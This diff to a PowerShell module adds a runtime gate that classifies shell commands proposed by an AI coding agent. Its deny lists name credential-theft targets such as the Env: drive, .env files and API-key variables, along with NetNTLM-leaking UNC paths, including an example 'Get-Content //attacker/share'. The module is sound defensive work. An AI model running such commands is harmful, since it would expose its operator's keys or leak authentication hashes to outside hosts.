@@ -21,9 +21,9 @@
 #     read only when no -d/-s switch is present (and bare or -a/-g). route: read only when 'print' is
 #     present and no -f/-p/add/delete/change token is -- 'arp -a -d x' and 'route print -f' (which
 #     real arp.exe/route.exe still act on) are correctly 'mutate'.
-#     KNOWN RESIDUAL (ADR-0006): Get-* is trusted by naming convention; a same-named hijacked
-#     function/alias/executable on PATH could mutate. The pure string classifier cannot detect that;
-#     the enforcement layer (lib/claude.ps1, next slice) adds a runtime Get-Command resolution check
+#     KNOWN RESIDUAL of the pure classifier (ADR-0006): Get-* is trusted by naming convention; a same-named
+#     hijacked function/alias/executable on PATH could mutate. The pure string classifier cannot detect that;
+#     Resolve-LokiCommandDecision (below, in THIS module) closes it with a runtime Get-Command resolution check
 #     (honor Get-* auto-read only for a real Cmdlet, not a Function/Alias/Application) as defense-in-depth.
 #     Reason values returned by Get-LokiAllowDecision are STABLE MACHINE TOKENS (English) -- this
 #     module does no i18n and produces no user-facing output; the caller renders/localizes.
@@ -31,12 +31,25 @@
 #     AutoAllowed; RequiresConfirm; Blocked; Reason }
 #     Thin caller-facing wrapper around Get-LokiCommandClass. AutoAllowed = (Class -eq 'read'),
 #     RequiresConfirm = (Class -eq 'mutate'), Blocked = (Class -eq 'denied'). Reason is one of
-#     'read-allowlisted' | 'mutation-requires-confirm' | 'denied'. This is what the future engine
-#     wiring (online + offline, DESIGN.md section 5.1: "one allow-list engine for both") calls to
-#     gate a proposed command before it runs.
+#     'read-allowlisted' | 'mutation-requires-confirm' | 'denied'. NOTE: this is the WEAK wrapper -- it does the
+#     string classification ONLY, none of the runtime blocks below. Engines gate with Resolve-LokiCommandDecision.
+#   Resolve-LokiCommandDecision -CommandLine <string> -> [hashtable]{ CommandLine; Class; Reason }
+#     THE runtime-safe gate both engines call (online via lib/claude.ps1 -> Get-LokiPreToolUseDecision, offline via
+#     lib/offline-agent.ps1) -- ONE engine-agnostic decision, DESIGN.md section 5.1. Get-LokiCommandClass PLUS:
+#     (1) the Get-* -> Get-Command Cmdlet-resolution check that closes the residual above (a hijacking
+#     Function/Alias/Application, or an unresolvable name, downgrades read -> mutate); (2) a hard 'denied' for any
+#     command carrying a non-space/tab control char, targeting the secret / process-env
+#     ($script:LokiSecretTargetPatterns), or side-effecting/exfiltrating -- UNC in either slash direction, a
+#     remote-target parameter, or a browser launch ($script:LokiReadSideEffectPatterns). Reason adds the machine
+#     tokens read-downgraded-unresolved | read-downgraded-noncmdlet | nonascii-control-blocked |
+#     secret-target-blocked | read-side-effect-blocked. Deterministic given the command table; unit-tested by
+#     mocking Get-Command. Use THIS, never Get-LokiAllowDecision, to gate a proposed command.
 # CLAUDE.md section 5: allow-list, not deny-list, is the gate (read-only automatic, anything
-# mutating requires confirmation); deny only defense-in-depth. This module is PURE LOGIC: no
-# environment calls, no external processes, no user-facing output -- it only classifies strings.
+# mutating requires confirmation); deny only defense-in-depth. Get-LokiCommandClass / Get-LokiAllowDecision are
+# PURE string logic -- no environment calls, no external processes, no user-facing output; they only classify
+# strings and stay table-testable without mocking. Resolve-LokiCommandDecision is the RUNTIME-SAFE layer on top and
+# is the ONE function here that consults the runtime (Get-Command), tested by mocking it -- it still emits no
+# user-facing output (stable English machine tokens only).
 # ASCII-only file (CLAUDE.md section 1: BOM only required for non-ASCII source) -- no BOM.
 Set-StrictMode -Version Latest
 
@@ -197,4 +210,121 @@ function Get-LokiAllowDecision {
         Blocked         = ($class -eq 'denied')
         Reason          = $reason
     }
+}
+
+# ===================================================================================================================
+# Runtime-safe enforcement layer (moved here from lib/claude.ps1 on 2026-07-18, issue #50). Get-LokiCommandClass /
+# Get-LokiAllowDecision above are the PURE string classifier; Resolve-LokiCommandDecision below is the RUNTIME-SAFE
+# gate the engines actually call. It adds what a pure string classifier CANNOT express: a Get-Command Cmdlet-
+# resolution check (closing the ADR-0006 Get-* residual) plus secret-target / side-effect denies. It lives HERE,
+# not in an engine module, so the ONE gate is engine-agnostic -- the online hook (lib/claude.ps1 ->
+# Get-LokiPreToolUseDecision) and the offline agent (lib/offline-agent.ps1) both call this same decision, matching
+# DESIGN.md section 5.1 ("one allow-list engine for both"). ADR-0006 / ADR-0007 / ADR-0021.
+# ===================================================================================================================
+
+# Secret-target deny (defense in depth -- adversarial review, ADR-0007). The pure classifier above is engine-agnostic
+# and trusts any Get-* by verb, so on its own it would auto-allow a genuine read cmdlet pointed at the process
+# environment or the secret-at-rest file -- letting a model read the very API key the online engine runs under and
+# surface it. These patterns block any otherwise-read command that targets the Env: PSDrive, a .env file, or an
+# auth-variable name. Case-insensitive (-match default). Deliberately broad (fail-closed): blocking an unrelated
+# *.env read is an acceptable cost for a read-only diagnosis.
+$script:LokiSecretTargetPatterns = @(
+    '\bEnv:',                    # the Env: PSDrive: Get-ChildItem Env:, Get-Item Env:\ANTHROPIC_API_KEY, ...
+    '\.env\b',                   # the secret-at-rest file (home\.env), absolute or relative
+    'GetEnvironmentVariable',    # .NET [*.Environment]::GetEnvironmentVariable(s)(...) -- reads the process env directly
+    'ANTHROPIC_API_KEY',
+    'CLAUDE_CODE_OAUTH_TOKEN',
+    'LOKI_SECRET'
+)
+
+# Side-effecting/exfiltrating "read" patterns (defense in depth -- adversarial review, ADR-0007, extended 2026-07-18
+# by the offline-agent review, ADR-0006 refinement). A command can classify as a provably-local read yet still reach
+# an EXTERNAL host and leak the NetNTLM hash / beacon. Block any otherwise-read command that: reaches a UNC path in
+# EITHER slash direction; names a remote target parameter; or launches the browser (Get-Help/-Online). Case-insensitive
+# (-match default). These live in the SHARED gate, so they harden Claude Code and the offline agent at once.
+$script:LokiReadSideEffectPatterns = @(
+    '\\\\',                          # UNC path with backslashes (\\host\share) -> forces SMB auth, leaks NetNTLM
+    '(?:^|[\s=,;''"(])[\\/]{2}',     # UNC via forward/mixed slashes (//host, /\host): .NET/GetPathRoot normalizes these
+                                     #   to a UNC too, so `Get-Content //attacker/share` still coerces SMB/NTLM auth. Anchored
+                                     #   at a token boundary and NOT preceded by ':' -> http:// and inline // are spared;
+                                     #   the danger is a UNC at a path-root position (offline-agent review 2026-07-18).
+    '\s-computer',                   # -ComputerName / -Computer on a read cmdlet (Get-CimInstance/-Service/-WinEvent/
+                                     #   -WmiObject) -> remote WinRM/DCOM auth to an attacker host -> NetNTLM leak. Native
+                                     #   ping/tracert (bare host) and positional Test-NetConnection stay allowed.
+    '\s-cn\b',                       # the -ComputerName alias
+    '\s-cimsession\b',               # -CimSession -> a remote CIM session
+    '\s-connectionuri\b',            # -ConnectionUri -> an explicit WSMan endpoint
+    '\bGet-Help\b',                  # Get-Help -Online opens the default browser (external process + network)
+    '\s-online\b'                    # the -Online switch on any read command (browser launch)
+)
+
+function Resolve-LokiCommandDecision {
+    param(
+        [Parameter(Mandatory = $true)][AllowEmptyString()][string]$CommandLine
+    )
+
+    $class = Get-LokiCommandClass -CommandLine $CommandLine
+    $reason = 'mutation-requires-confirm'
+    if ($class -eq 'denied') { $reason = 'denied' }
+    elseif ($class -eq 'read') { $reason = 'read-allowlisted' }
+
+    if ($class -eq 'read') {
+        # The classifier already guaranteed no unsafe char/newline for a 'read', so whitespace tokenizing is safe.
+        $first = ($CommandLine.Trim() -split '\s+')[0]
+
+        # The Get-* naming-convention branch is the ONLY read path trusted by convention rather than by an explicit
+        # name (ADR-0006 residual). Verify at runtime that the name really resolves to a Cmdlet -- a hijacking
+        # Function/Alias/Application earlier on PATH, or an unresolvable name, is NOT provably safe -> downgrade.
+        #
+        # CultureInvariant, and this is the SECURITY-relevant half of the pair (the other is Get-LokiCommandClass's
+        # identical pattern ABOVE in this same file): this regex decides whether the runtime check RUNS AT ALL. -match
+        # folds case by the current culture, so under tr-TR 'Get-ChildItem' stops matching and the Cmdlet verification
+        # is SILENTLY SKIPPED -- a hijacking Function named Get-ChildItem would then stay 'read'. Today the two patterns
+        # fail together (the classifier never calls this 'read'), so the pair is consistent and fails closed; fixing
+        # only ONE of them would open exactly that hole. They must stay identical -- if you touch one, touch both.
+        if ([regex]::IsMatch($first, '^Get-[A-Za-z][A-Za-z0-9]*$', 'IgnoreCase,CultureInvariant')) {
+            $resolved = Get-Command -Name $first -ErrorAction SilentlyContinue | Select-Object -First 1
+            if ($null -eq $resolved) {
+                $class = 'mutate'; $reason = 'read-downgraded-unresolved'
+            }
+            elseif ($resolved.CommandType -ne 'Cmdlet') {
+                $class = 'mutate'; $reason = 'read-downgraded-noncmdlet'
+            }
+        }
+    }
+
+    # Online-enforcement defense in depth on anything NOT already denied -- i.e. read OR mutate (adversarial
+    # review, ADR-0007/0008). Applied to 'mutate' too, not just 'read': `chat` (ADR-0008) turns a mutate into a
+    # confirmable 'ask', so a mutate that targets the secret, reaches a UNC path, or carries a control char must
+    # become a HARD 'denied' here -- never merely confirmable. (For the read-only headless ask/scan a mutate was
+    # denied anyway, so this only tightens; it never loosens.)
+    if ($class -ne 'denied') {
+        # (a) Reject non-space/tab whitespace or control characters. The pure classifier's unsafe-char check is
+        #     ASCII-only while its tokenizer is Unicode-aware, so a U+2028/NBSP/control char could ride along; a
+        #     provably-safe command never needs one. Fail closed rather than trust the mismatch.
+        if ($CommandLine -match '[^\S \t]' -or $CommandLine -match '[\x00-\x08\x0E-\x1F\x7F]') {
+            $class = 'denied'; $reason = 'nonascii-control-blocked'
+        }
+    }
+    if ($class -ne 'denied') {
+        # (b) Secret-target: any command (read OR a confirmable mutate) that reaches the process environment or the
+        #     secret file would expose/exfiltrate the API key the engine runs under -> hard block, never confirm.
+        foreach ($pat in $script:LokiSecretTargetPatterns) {
+            if ($CommandLine -match $pat) {
+                $class = 'denied'; $reason = 'secret-target-blocked'
+                break
+            }
+        }
+    }
+    if ($class -ne 'denied') {
+        # (c) Side-effecting/exfiltrating command (UNC/NTLM, browser launch) -- read OR mutate.
+        foreach ($pat in $script:LokiReadSideEffectPatterns) {
+            if ($CommandLine -match $pat) {
+                $class = 'denied'; $reason = 'read-side-effect-blocked'
+                break
+            }
+        }
+    }
+
+    return @{ CommandLine = $CommandLine; Class = $class; Reason = $reason }
 }
